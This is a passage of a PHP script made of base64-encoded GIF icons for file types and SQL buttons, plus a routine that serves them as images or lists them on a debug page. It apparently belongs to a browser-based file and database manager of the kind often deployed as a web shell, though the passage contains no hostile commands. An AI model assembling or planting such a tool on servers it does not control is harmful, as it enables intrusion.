"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAIep3BE9mllic3B5iVpjdMvh/MLc+y1U".
"p9Pm/GVufc7j/MzV/9Xm/EOm99bn/Njp/a7Q+tTm/LHS+eXw/t3r/Nnp/djo/Nrq/fj7/9vq/Nfo".
"/Mbe+8rh/Mng+7jW+rvY+r7Z+7XR9dDk/NHk/NLl/LTU+rnX+8zi/LbV++fx/e72/vH3/vL4/u31".
"/e31/uDu/dzr/Orz/eHu/fX6/vH4/v////v+/3ez6vf7//T5/kGS4Pv9/7XV+rHT+r/b+rza+vP4".
"/uz0/urz/u71/uvz/dTn/M/k/N3s/dvr/cjg+8Pd+8Hc+sff+8Te+/D2/rXI8rHF8brM87fJ8nmP".
"wr3N86/D8KvB8F9neEFotEBntENptENptSxUpx1IoDlfrTRcrZeeyZacxpmhzIuRtpWZxIuOuKqz".
"9ZOWwX6Is3WIu5im07rJ9J2t2Zek0m57rpqo1nKCtUVrtYir3vf6/46v4Yuu4WZvfr7P6sPS6sDQ".
"66XB6cjZ8a/K79/s/dbn/ezz/czd9mN0jKTB6ai/76W97niXz2GCwV6AwUdstXyVyGSDwnmYz4io".
"24Oi1a3B45Sy4ae944Ccz4Sj1n2GlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAjnACtVCkCw4JxJAQQqFBjAxo0MNGqsABQAh6CFA3nk0MHiRREVDhzsoLQwAJ0gT4ToecSHAYMz".
"aQgoDNCCSB4EAnImCiSBjUyGLobgXBTpkAA5I6pgmSkDz5cuMSz8yWlAyoCZFGb4SQKhASMBXJpM".
"uSrQEQwkGjYkQCTAy6AlUMhWklQBw4MEhgSA6XPgRxS5ii40KLFgi4BGTEKAsCKXihESCzrsgSQC".
"yIkUV+SqOYLCA4csAup86OGDkNw4BpQ4OaBFgB0TEyIUKqDwTRs4a9yMCSOmDBoyZu4sJKCgwIDj".
"yAsokBkQADs=",
"multipage"=>"R0lGODlhCgAMAJEDAP/////3mQAAAAAAACH5BAEAAAMALAAAAAAKAAwAAAIj3IR".
"pJhCODnovidAovBdMzzkixlXdlI2oZpJWEsSywLzRUAAAOw==",
"sort_asc"=>
"R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMa".
"SLrcPcE9GKUaQlQ5sN5PloFLJ35OoK6q5SYAOw==",
"sort_desc"=>
"R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMb".
"SLrcOjBCB4UVITgyLt5ch2mgSJZDBi7p6hIJADs=",
"sql_button_drop"=>
"R0lGODlhCQALAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".
"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".
"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".
"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".
"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".
"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".
"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".
"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".
"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".
"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAsA".
"AAg4AP8JREFQ4D+CCBOi4MawITeFCg/iQhEPxcSBlFCoQ5Fx4MSKv1BgRGGMo0iJFC2ehHjSoMt/".
"AQEAOw==",
"sql_button_empty"=>
"R0lGODlhCQAKAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".
"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".
"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".
"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".
"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".
"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".
"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".
"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".
"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".
"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAoA".
"AAgjAP8JREFQ4D+CCBOiMMhQocKDEBcujEiRosSBFjFenOhwYUAAOw==",
"sql_button_insert"=>
"R0lGODlhDQAMAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".
"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".
"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".
"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".
"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".
"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".
"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".
"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".
"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".
"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAANAAwA".
"AAgzAFEIHEiwoMGDCBH6W0gtoUB//1BENOiP2sKECzNeNIiqY0d/FBf+y0jR48eQGUc6JBgQADs=",
"up"=>
"R0lGODlhFAAUALMAAAAAAP////j4+OPj493d3czMzLKysoaGhk1NTf///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJq734ns1PnkcgjgXwhcNQrIVhmFonzxwQjnie27jg".
"+4Qgy3XgBX4IoHDlMhRvggFiGiSwWs5XyDftWplEJ+9HQCyx2c1YEDRfwwfxtop4p53PwLKOjvvV".
"IXtdgwgdPGdYfng1IVeJaTIAkpOUlZYfHxEAOw==",
"write"=>
"R0lGODlhFAAUALMAAAAAAP///93d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze".
"EQYQLUAsGgM0Wwt3bCJfQSFx10yyBlJn8RfEMgM9X+3qHWq5iED5yCsMCl111knDpuXfYls+IK61".
"LXd+WWEHLUd/ToJFZQOOj5CRjiCBlZaXIBEAOw==",
"ext_asp"=>
"R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD/".
"/////ywAAAAAEAAQAAAESvDISasF2N6DMNAS8Bxfl1UiOZYe9aUwgpDTq6qP/IX0Oz7AXU/1eRgI".
"D6HPhzjSeLYdYabsDCWMZwhg3WWtKK4QrMHohCAS+hABADs=",
"ext_mp3"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU".
"aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc".
"IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=",
"ext_avi"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///4CAgMDAwP8AAAAAAAAAAAAAAANM".
"WFrS7iuKQGsYIqpp6QiZ1FFACYijB4RMqjbY01DwWg44gAsrP5QFk24HuOhODJwSU/IhBYTcjxe4".
"PYXCyg+V2i44XeRmSfYqsGhAAgA7",
"ext_cgi"=>
"R0lGODlhEAAQAGYAACH5BAEAAEwALAAAAAAQABAAhgAAAJtqCHd3d7iNGa+HMu7er9GiC6+IOOu9".
"DkJAPqyFQql/N/Dlhsyyfe67Af/SFP/8kf/9lD9ETv/PCv/cQ//eNv/XIf/ZKP/RDv/bLf/cMah6".
"LPPYRvzgR+vgx7yVMv/lUv/mTv/fOf/MAv/mcf/NA//qif/MAP/TFf/xp7uZVf/WIP/OBqt/Hv/S".
"Ev/hP+7OOP/WHv/wbHNfP4VzV7uPFv/pV//rXf/ycf/zdv/0eUNJWENKWsykIk9RWMytP//4iEpQ".
"Xv/9qfbptP/uZ93GiNq6XWpRJ//iQv7wsquEQv/jRAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeegEyCg0wBhIeHAYqIjAEwhoyEAQQXBJCRhQMuA5eSiooGIwafi4UM".
"BagNFBMcDR4FQwwBAgEGSBBEFSwxNhAyGg6WAkwCBAgvFiUiOBEgNUc7w4ICND8PKCFAOi0JPNKD".
"AkUnGTkRNwMS34MBJBgdRkJLCD7qggEPKxsJKiYTBweJkjhQkk7AhxQ9FqgLMGBGkG8KFCg8JKAi".
"RYtMAgEAOw==",
"ext_cmd"=>
"R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgICAAP//AAAAAANI".
"eLrcJzDKCYe9+AogBvlg+G2dSAQAipID5XJDIM+0zNJFkdL3DBg6HmxWMEAAhVlPBhgYdrYhDQCN".
"dmrYAMn1onq/YKpjvEgAADs=",
"ext_cpp"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANC".
"WLPc9XCASScZ8MlKicobBwRkEIkVYWqT4FICoJ5v7c6s3cqrArwinE/349FiNoFw44rtlqhOL4Ra".
"Eq7YrLDE7a4SADs=",
"ext_ini"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///8DAwICAgICAAP//AAAAAAAAAANL".
"aArB3ioaNkK9MNbHs6lBKIoCoI1oUJ4N4DCqqYBpuM6hq8P3hwoEgU3mawELBEaPFiAUAMgYy3VM".
"SnEjgPVarHEHgrB43JvszsQEADs=",
"ext_diz"=>
"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAP///15phcfb6NLs/7Pc/+P0/3J+l9bs".
"/52nuqjK5/n///j///7///r//0trlsPn/8nn/8nZ5trm79nu/8/q/9Xt/9zw/93w/+j1/9Hr/+Dv".
"/d7v/73H0MjU39zu/9br/8ne8tXn+K6/z8Xj/LjV7dDp/6K4y8bl/5O42Oz2/7HW9Ju92u/9/8T3".
"/+L//+7+/+v6/+/6/9H4/+X6/+Xl5Pz//+/t7fX08vD//+3///P///H///P7/8nq/8fp/8Tl98zr".
"/+/z9vT4++n1/b/k/dny/9Hv/+v4/9/0/9fw/8/u/8vt/+/09xUvXhQtW4KTs2V1kw4oVTdYpDZX".
"pVxqhlxqiExkimKBtMPL2Ftvj2OV6aOuwpqlulyN3cnO1wAAXQAAZSM8jE5XjgAAbwAAeURBYgAA".
"dAAAdzZEaE9wwDZYpmVviR49jG12kChFmgYuj6+1xeLn7Nzj6pm20oeqypS212SJraCyxZWyz7PW".
"9c/o/87n/8DX7MHY7q/K5LfX9arB1srl/2+fzq290U14q7fCz6e2yXum30FjlClHc4eXr6bI+bTK".
"4rfW+NXe6Oby/5SvzWSHr+br8WuKrQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAjgACsJrDRHSICDQ7IMXDgJx8EvZuIcbPBooZwbBwOMAfMmYwBCA2sEcNBjJCMYATLIOLiokocm".
"C1QskAClCxcGBj7EsNHoQAciSCC1mNAmjJgGGEBQoBHigKENBjhcCBAIzRoGFkwQMNKnyggRSRAg".
"2BHpDBUeewRV0PDHCp4BSgjw0ZGHzJQcEVD4IEHJzYkBfo4seYGlDBwgTCAAYvFE4KEBJYI4UrPF".
"CyIIK+woYjMwQQI6Cor8mKEnxR0nAhYKjHJFQYECkqSkSa164IM6LhLRrr3wwaBCu3kPFKCldkAA".
"Ow==",
"ext_doc"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///8DAwAAA/4CAgAAAAAAAAAAAAANR".
"WErcrrCQQCslQA2wOwdXkIFWNVBA+nme4AZCuolnRwkwF9QgEOPAFG21A+Z4sQHO94r1eJRTJVmq".
"MIOrrPSWWZRcza6kaolBCOB0WoxRud0JADs=",
"ext_exe"=>
"R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7".
"WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt".
"xhIAOw==",
"ext_h"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANB".
"WLPc9XCASScZ8MlKCcARRwVkEAKCIBKmNqVrq7wpbMmbbbOnrgI8F+q3w9GOQOMQGZyJOspnMkKo".
"Wq/NknbbSgAAOw==",
"ext_hpp"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANF".
"WLPc9XCASScZ8MlKicobBwRkEAGCIAKEqaFqpbZnmk42/d43yroKmLADlPBis6LwKNAFj7jfaWVR".
"UqUagnbLdZa+YFcCADs=",
"ext_htaccess"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6".
"WEXW/k6RAGsjmFoYgNBbEwjDB25dGZzVCKgsR8LhSnprPQ406pafmkDwUumIvJBoRAAAlEuDEwpJ".
"AAA7",
"ext_html"=>
"R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz".
"c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P".
"KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk".
"Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR".
"ADs=",
"ext_jpg"=>
"R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci".
"Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd".
"FxEAOw==",
"ext_js"=>
"R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH".
"k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs".
"a00AjYYBbc/o9HjNniUAADs=",
"ext_lnk"=>
"R0lGODlhEAAQAGYAACH5BAEAAFAALAAAAAAQABAAhgAAAABiAGPLMmXMM0y/JlfFLFS6K1rGLWjO".
"NSmuFTWzGkC5IG3TOo/1XE7AJx2oD5X7YoTqUYrwV3/lTHTaQXnfRmDGMYXrUjKQHwAMAGfNRHzi".
"Uww5CAAqADOZGkasLXLYQghIBBN3DVG2NWnPRnDWRwBOAB5wFQBBAAA+AFG3NAk5BSGHEUqwMABk".
"AAAgAAAwAABfADe0GxeLCxZcDEK6IUuxKFjFLE3AJ2HHMRKiCQWCAgBmABptDg+HCBZeDAqFBWDG".
"MymUFQpWBj2fJhdvDQhOBC6XF3fdR0O6IR2ODwAZAHPZQCSREgASADaXHwAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeZgFBQPAGFhocAgoI7Og8JCgsEBQIWPQCJgkCOkJKUP5eYUD6PkZM5".
"NKCKUDMyNTg3Agg2S5eqUEpJDgcDCAxMT06hgk26vAwUFUhDtYpCuwZByBMRRMyCRwMGRkUg0xIf".
"1lAeBiEAGRgXEg0t4SwroCYlDRAn4SmpKCoQJC/hqVAuNGzg8E9RKBEjYBS0JShGh4UMoYASBiUQ".
"ADs=",
"ext_log"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAMDAwICAgICAAAAAgAAA////AAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARQEKEwK6UyBzC475gEAltJklLRAWzbClRhrK4Ly5yg7/wN".
"zLUaLGBQBV2EgFLV4xEOSSWt9gQQBpRpqxoVNaPKkFb5Eh/LmUGzF5qE3+EMIgIAOw==",
"ext_php"=>
"R0lGODlhEAAQAAAAACH5BAEAAAEALAAAAAAQABAAgAAAAAAAAAImDA6hy5rW0HGosffsdTpqvFlg".
"t0hkyZ3Q6qloZ7JimomVEb+uXAAAOw==",
"ext_pl"=>
"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo".
"GLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7",
"ext_swf"=>
"R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/O".
"nAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".
"ABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GA".
"GBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgC".
"NysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=",
"ext_tar"=>
"R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JIC".
"Wv///wCIWBE2AAAyUJicqISHl4CAAPD4/+Dg8PX6/5OXpL7H0+/2/aGmsTIyMtTc5P//sfL5/8XF".
"HgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGD".
"UyWd/0it/1u1/3NzAP950P990mO5/7v14YzvzXLrwoXI/5vS/7Dk/wBXov9syvRjwOhatQCHV17p".
"uo0GUQBWnP++8Lm5AP+j5QBUlACKWgA4bjJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeegAKCg4SFSxYNEw4gMgSOj48DFAcHEUIZREYoJDQzPT4/AwcQCQkg".
"GwipqqkqAxIaFRgXDwO1trcAubq7vIeJDiwhBcPExAyTlSEZOzo5KTUxMCsvDKOlSRscHDweHkMd".
"HUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FB".
"u4tLAgEAOw==",
"ext_txt"=>
"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ".
"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7".
"UpPWG3Ig6Hq/XmRjuZwkAAA7",
"ext_wri"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao".
"a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=",
"ext_xml"=>
"R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA".
"gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx".
"OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ".
"IQA7"
 );
 //For simple size- and speed-optimization.
 $imgequals = array(
  "ext_tar"=>array("ext_tar","ext_r00","ext_ace","ext_arj","ext_bz","ext_bz2","ext_tbz","ext_tbz2","ext_tgz","ext_uu","ext_xxe","ext_zip","ext_cab","ext_gz","ext_iso","ext_lha","ext_lzh","ext_pbk","ext_rar","ext_uuf"),
  "ext_php"=>array("ext_php","ext_php3","ext_php4","ext_php5","ext_phtml","ext_shtml","ext_htm"),
  "ext_jpg"=>array("ext_jpg","ext_gif","ext_png","ext_jpeg","ext_jfif","ext_jpe","ext_bmp","ext_ico","ext_tif","tiff"),
  "ext_html"=>array("ext_html","ext_htm"),
  "ext_avi"=>array("ext_avi","ext_mov","ext_mvi","ext_mpg","ext_mpeg","ext_wmv","ext_rm"),
  "ext_lnk"=>array("ext_lnk","ext_url"),
  "ext_ini"=>array("ext_ini","ext_css","ext_inf"),
  "ext_doc"=>array("ext_doc","ext_dot"),
  "ext_js"=>array("ext_js","ext_vbs"),
  "ext_cmd"=>array("ext_cmd","ext_bat","ext_pif"),
  "ext_wri"=>array("ext_wri","ext_rtf"),
  "ext_swf"=>array("ext_swf","ext_fla"),
  "ext_mp3"=>array("ext_mp3","ext_au","ext_midi","ext_mid"),
  "ext_htaccess"=>array("ext_htaccess","ext_htpasswd","ext_ht","ext_hta","ext_so")
 );
 if (!$getall)
 {
  header("Content-type: image/gif");
  header("Cache-control: public");
  header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
  header("Cache-control: max-age=".(60*60*24*7));
  header("Last-Modified: ".date("r",filemtime(__FILE__)));
  foreach($imgequals as $k=>$v) {if (in_array($img,$v)) {$img = $k; break;}}
  if (empty($images[$img])) {$img = "small_unk";}
  if (in_array($img,$ext_tar)) {$img = "ext_tar";}
  echo base64_decode($images[$img]);
 }
 else
 {
  foreach($imgequals as $a=>$b) {foreach ($b as $d) {if ($a != $d) {if (!empty($images[$d])) {echo("Warning! Remove \$images[".$d."]<br>");}}}}
  natsort($images);
  $k = array_keys($images);
  echo  "<center>";
  foreach ($k as $u) {echo $u.":<img src=\"".$surl."act=img&img=".$u."\" border=\"1\"><br>";}
  echo "</center>";
 }
 exit;
}
